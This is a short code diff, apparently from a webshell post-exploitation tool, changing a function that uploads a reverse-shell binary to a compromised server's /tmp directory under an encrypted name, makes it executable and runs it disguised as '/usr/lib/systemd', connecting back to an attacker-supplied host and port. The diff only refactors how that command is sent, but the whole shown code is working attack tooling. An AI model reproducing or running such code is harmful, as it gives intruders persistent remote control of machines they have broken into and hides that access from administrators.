@@ -6,7 +6,7 @@ from os import getcwd, path
 from threading import Thread
 
 from libs.config import alias, color
-from libs.myapp import delay_send, send, is_windows
+from libs.myapp import delay_send, send, is_windows, get_system_code
 from webshell_plugins.upload import run as upload
 
 
@@ -59,7 +59,7 @@ def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"
         filename = encrypt(f"{lhost}-{port}")
         if not upload(path.join(getcwd(), "libs", "reverse_server_light"), "/tmp/%s" % filename, True):
             return
-        command = f"system('cd /tmp && chmod +x {filename} && ./{filename} {fakename}');"
+        command = get_system_code(f"cd /tmp && chmod +x {filename} && ./{filename} {fakename}")
     t = Thread(target=delay_send, args=(2, command))
     t.setDaemon(True)
     t.start()
